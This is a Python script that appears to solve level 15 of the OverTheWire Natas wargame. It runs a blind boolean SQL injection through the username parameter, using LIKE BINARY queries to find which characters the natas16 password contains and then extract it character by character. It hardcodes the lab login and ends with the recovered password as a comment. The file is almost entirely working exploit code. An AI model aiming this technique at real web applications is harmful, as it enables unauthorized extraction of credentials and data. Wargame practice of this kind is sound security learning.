import urllib.request
dictionary = []
password = []
alphanumeric = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def get(URL):
    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
    password_mgr.add_password(None, URL, "natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")
    handler = urllib.request.HTTPBasicAuthHandler(password_mgr)
    opener = urllib.request.build_opener(handler)
    response_encoded = opener.open(URL)
    return response_encoded.read().decode("ascii")

for char in alphanumeric:
    print(char)
    #LIKE in SQL is case insensitive, used LIKE BINARY to get case sensitive comparisson
    URL = f"""http://natas15.natas.labs.overthewire.org/index.php?username=natas16"%20AND%20password%20LIKE%20BINARY%20"%{char}%&debug=1"""
    response_decoded = get(URL)
    if "This user exists." in response_decoded:
        dictionary.append(char) 
print(dictionary)
while len(password) < 32:
    for char in dictionary:
        print(char)
        password.append(char)
        URL = f"""http://natas15.natas.labs.overthewire.org/index.php?username=natas16"%20AND%20password%20LIKE%20BINARY%20"{"".join(password)}%&debug=1"""
        response_decoded = get(URL)
        if "This user exists." in response_decoded:
            continue 
        password.pop()
        print(password)
"".join(password)
#TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V